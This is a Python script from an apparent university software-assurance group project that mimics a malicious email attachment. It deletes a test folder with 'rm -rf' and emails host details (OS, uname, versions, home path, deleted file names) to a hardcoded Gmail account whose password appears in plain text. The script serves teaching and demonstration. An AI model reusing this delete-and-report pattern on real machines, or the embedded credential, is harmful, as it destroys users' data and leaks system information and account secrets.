#!/usr/bin/python
'''
This script checks the operating system of the user.
It then checks to see if a test directory: maliciousEmailTestDirectory  is present in
the users home directory. If so, it deletes it.
It then send an email back to:
about the user, the system, and the files deleted.

This is a group project in Infsys6868 - Software Assurance
Mathew Kaplan
Kevin Folkl
Wes Jonas
Bryce Benjamin
Roshni Sharma
Ryan Bao
Gene Browder
'''
import os
import shutil
import platform
import sys
import smtplib
import time

def linux_distribution():
    try:
        return platform.linux_distribution()
    except:
        return "N/A"

def send_email(user, filesDeleted):
    try:
        tm = time.strftime('%a, %d %b %Y %H:%M:%S %Z(%z)')

        fromaddr = 'genebrowdertest@gmail.com'
        toaddrs  = 'genebrowdertest@gmail.com'
        msg 	 = "\r\n".join([
            "From: genebrowdertest@gmail.com",
            "To: genebrowdertest@gmail.com",
            "Subject: "+home+" Files Deleted on " + tm ,
            "",
            """Python version: %s
            dist: %s
            linux_distribution: %s
            system: %s
            machine: %s
            platform: %s
            uname: %s
            version: %s
            mac_ver: %s
            files_deleted: %s
            """ % (
                sys.version.split('\n'),
                str(platform.dist()),
                linux_distribution(),
                platform.system(),
                platform.machine(),
                platform.platform(),
                platform.uname(),
                platform.version(),
                platform.mac_ver(),
                filesDeleted
            )
        ])
        username = 'genebrowdertest@gmail.com'
        password = '2Q2-yP4-gwf-tbt'
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, toaddrs, msg)
        server.quit()
        print 'successfully sent the mail'
    except:
        print "failed to send mail"

if (platform.system() == "Linux") or (platform.system() == "Linux2"):
    print ( "Linux")

    home = os.path.expanduser("~")
    folder = home+"/maliciousEmailTestDirectory/"
    #print(os.listdir(folder))

    if os.path.exists(folder):
        print("Folder found")
        filesInDir=os.listdir(folder)
        os.system("rm -rf %s" %folder)
        print("Folder deleted")

        send_email(home, filesInDir)

    else:
        print("Unable to find folder.")
elif platform.system() == "Darwin":
    print ("Mac")

    home = os.path.expanduser("~")
    folder = home+"/maliciousEmailTestDirectory/"
    #print(os.listdir(folder))

    if os.path.exists(folder):
        print("Folder found")
        filesInDir = os.listdir(folder)
        shutil.rmtree(folder)
        print("Folder deleted")

        send_email(home, filesInDir)

    else:
        print("Unable to find folder.")

else:
    print ("Beyond Scope")

